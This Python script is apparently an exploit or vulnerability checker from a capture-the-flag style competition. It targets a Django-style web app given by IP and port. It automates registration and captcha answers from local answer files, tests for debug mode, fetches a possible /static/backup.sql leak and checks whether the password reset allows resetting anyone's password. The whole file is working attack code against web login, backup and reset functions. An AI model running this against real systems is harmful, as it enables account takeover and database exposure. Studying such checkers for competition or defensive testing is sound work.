#!/usr/bin/env python

import sys
import re
import random
import string

import requests
from pyquery import PyQuery


class Bot:
    def __init__(self, ip, port, csrfname = 'csrfmiddlewaretoken'):
        self.ip = ip
        self.port = port
        self.url = 'http://%s:%s/' % (ip, port)
        self.username = self._generate_randstr(5)
        self.password = '123456'
        self.change_pass = '654321'
        self.mail = 'root@grassfish.net'
        self.csrfname = csrfname
        self.integral = None
        self.session = requests.session()

    def _get_uuid(self, html):
        dom = PyQuery(html)
        return dom('form canvas').attr('rel')

    def _get_answer(self, html):
        uuid = self._get_uuid(html)
        answer = {}
        with open('./ans/ans%s.txt' % uuid, 'r') as f:
            for line in f.readlines():
                if line != '\n':
                    ans = line.strip().split('=')
                    answer[ans[0].strip()] = ans[1].strip()
        x = random.randint(int(float(answer['ans_pos_x_1'])), int(float(answer['ans_width_x_1']) + float(answer['ans_pos_x_1'])))
        y = random.randint(int(float(answer['ans_pos_y_1'])), int(float(answer['ans_height_y_1']) + float(answer['ans_pos_y_1'])))
        return x,y

    def _get_token(self, html):
        dom = PyQuery(html)
        form = dom("form")
        token = str(PyQuery(form)("input[name=\"%s\"]" % self.csrfname).attr("value")).strip()
        return token

    def _generate_randstr(self, len=10):
        return ''.join(random.sample(string.ascii_letters, len))

    def login(self):
        rs = self.session.get(self.url + 'login')
        html = rs.text
        token = self._get_token(html)
        x,y = self._get_answer(html)
        rs = self.session.post(url=self.url + 'login', data={
            self.csrfname: token,
            "username": self.username,
            "password": self.password,
            "captcha_x": x,
            "captcha_y": y
        })
        try:
            dom = PyQuery(rs.text)
            error = dom("div.alert.alert-danger")
            error = PyQuery(error).text().strip()
            if len(error):
                return False
        except:
            pass
        return True

    def register(self, invite=''):
        rs = self.session.get(self.url + 'register')
        html = rs.text
        token = self._get_token(html)
        x,y = self._get_answer(html)
        rs = self.session.post(url=self.url + 'register', data={
            self.csrfname: token,
            "username": self.username,
            "password": self.password,
            "password_confirm": self.password,
            "mail": self.mail,
            "invite_user": invite,
            "captcha_x": x,
            "captcha_y": y,
        })
        try:
            dom = PyQuery(rs.text)
            error = dom("div.alert.alert-danger")
            error = PyQuery(error).text().strip()
            if len(error):
                return False
        except:
            pass
        return True

    def reset(self):
        res = self.session.get(self.url + 'pass/reset')
        html = res.text
        token = self._get_token(html)
        x,y = self._get_answer(html)
        password = self._generate_randstr(10)
        rs = self.session.post(self.url + 'pass/reset', data={
            self.csrfname: token,
            'username': self.username,
            'mail': self.mail,
            'password': password,
            'password_confirm': password,
            "captcha_x": x,
            "captcha_y": y
        })
        dom = PyQuery(rs.text)
        failed = dom('div.alert.alert-danger')
        failed = PyQuery(failed).text().strip()
        if len(failed):
            return False
        return True


def exploit(ip, port, csrfname):
    try:
        error_url = 'http://%s:%s/%s' % (ip, port, ''.join(random.sample(string.ascii_letters, 3)))
        res = requests.get(error_url)
        if re.search('DEBUG', res.content):
            print '[+] Debug Mode Open, Vulnerable'
        else:
            print '[-] Debug Mode Close, Secure'

        backup_url = 'http://%s:%s/static/backup.sql' % (ip, port)
        res = requests.get(backup_url)
        if res.status_code == 200:
            print '[+] Backup Leak, Vulnerable'
        else:
            print '[-] Backup Not found, Secure'

        bot = Bot(ip, port, csrfname)
        bot.register()
        if bot.reset():
            print '[+] Reset Anyone\'s Password, Vulnerable'
        else:
            print '[+] Reset Password Failed, Secure'
        print '[-] Done'
    except Exception as e:
        return '[!] Error, Unknown Exception,' + str(e)


if __name__ == '__main__':
    if len(sys.argv) != 4:
        print("usage: python %s %s %s %s" % (sys.argv[0], '127.0.0.1', '80', 'csrfmiddlewaretoken'))
        exit(0)
    ip = sys.argv[1]
    port = sys.argv[2]
    csrfname = sys.argv[3]
    exploit(str(ip), str(port), csrfname)
